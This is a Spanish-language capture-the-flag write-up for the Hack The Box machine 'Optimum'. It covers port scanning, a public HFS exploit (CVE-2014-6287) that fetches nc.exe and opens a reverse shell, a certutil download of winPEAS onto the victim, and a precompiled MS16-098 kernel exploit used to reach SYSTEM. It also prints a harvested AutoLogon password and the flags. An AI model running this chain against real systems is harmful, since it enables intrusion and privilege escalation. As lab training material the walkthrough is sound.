---
layout: post
title: Optimum
date: 2023-02-03
description:
img:
fig-caption:
tags: [eWPT, OSCP]
---
___

<center><img src="/writeups/assets/img/Optimum-htb/Optimum_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Exploit HttpFileServer (CVE-2014-6287)

* Enumeración con Winpeas y Windows-exploit-suggester

* Exploit MS16-098 (Integer Overflow, Microsoft 8.1)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.8 -sS -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 12:18 GMT
Nmap scan report for 10.10.10.8
Host is up (0.20s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80 10.10.10.8 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 12:19 GMT
Nmap scan report for 10.10.10.8
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Puerto 80 (HTTP)

Encuentro una vulnerabilidad par el servicio que se está empleando

<img src="/writeups/assets/img/Optimum-htb/1.png" alt="">

Busco por el CVE y me descargo el exploit de Github

```null
wget https://raw.githubusercontent.com/roughiz/cve-2014-6287.py/master/cve-2014-6287.py
```

Veo el panel de ayuda

```null
python2 cve-2014-6287.py
[-] Something went wrong..!
[-] Usage is: python cve-2014-6287.py <Target IP address> <Target Port Number> <Local ip where http server listen> <local port for the reverse shell>
[-] Don't forget to have an http server with will serve the nc.exe file like http://local_ip:80/nc.exe
```

Me comparto el nc por un servicio http con python y ejecuto. Por el puerto 443 no recibo nada, pero si lo cambio por otro sí

```null
python2 cve-2014-6287.py 10.10.10.8 80 10.10.16.2 443
python2 cve-2014-6287.py 10.10.10.8 80 10.10.16.2 1234
```

Gano acceso al sistema

```null
nc -nlvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.8.
Ncat: Connection from 10.10.10.8:49167.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

Puedo visualizar la primera flag

```null
C:\Users\kostas\Desktop>type user.txt
type user.txt
82eccce4e9b846fe25c0ea0eb668858f
```

# Escalada

Me descargo el winpeas en la máquina víctima

```null
C:\Temp>certutil.exe -split -f -urlcache http://10.10.16.2/winpeas.exe winpeas.exe
certutil.exe -split -f -urlcache http://10.10.16.2/winpeas.exe winpeas.exe
****  Online  ****
  000000  ...
  1e0a00
CertUtil: -URLCache command completed successfully.
```

Encuentra las credenciales del usuario kostas, pero como ya estoy como este usuario no me sirven de nada

```null
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS*
```

Copio las propiedades del sistema a un archivo en mi equipo local

```null
C:\Temp>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 
System Boot Time:          10/2/2023, 11:15:48 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.429 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.859 MB
Virtual Memory: In Use:    644 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Me descargo el windows-exploit-suggester

```null
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
```

Para ejecutarlo, primero tiene que descargar una base de datos con los exploits

```null
python2 windows-exploit-suggester.py -u
[*] initiating winsploit version 3.3...
[+] writing to file 2023-02-04-mssb.xls
[*] done
```

Al ejecutar me aparece un error

```null
python2 windows-exploit-suggester.py -d 2023-02-04-mssb.xls -i systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
Traceback (most recent call last):
  File "windows-exploit-suggester.py", line 1639, in <module>
    main()
  File "windows-exploit-suggester.py", line 414, in main
    wb = xlrd.open_workbook(ARGS.database)
  File "/home/rubbx/.local/lib/python2.7/site-packages/xlrd/__init__.py", line 170, in open_workbook
    raise XLRDError(FILE_FORMAT_DESCRIPTIONS[file_format]+'; not supported')
xlrd.biffh.XLRDError: Excel xlsx file; not supported
```

Para solucionarlo, me abro el documento en libreoffice y lo exporto al formato XLS. Me voy a centrar en la segunda vulnearabilidad que aparece

```null
python2 windows-exploit-suggester.py -d 2023-02-04-mssb.xls -i systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
```

Lo examino con searchsploit

```null
searchsploit -x 41020

// Source: https://github.com/sensepost/ms16-098/tree/b85b8dfdd20a50fc7bc6c40337b8de99d6c4db80
// Binary: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
```

En los comentarios comparten el binario compilado. Lo descargo y transfiero a la máquina víctima. Al ejecutarlo me convierte directamente en nt authority\system

```null
C:\Temp>.\41020.exe
.\41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Temp>whoami
whoami
nt authority\system

C:\Temp>
```

Puedo visualizar la segunda flag

```null
C:\Users\Administrator\Desktop>type root.txt
type root.txt
2f7d8272d572789b3ff16da1b537f9c2
```
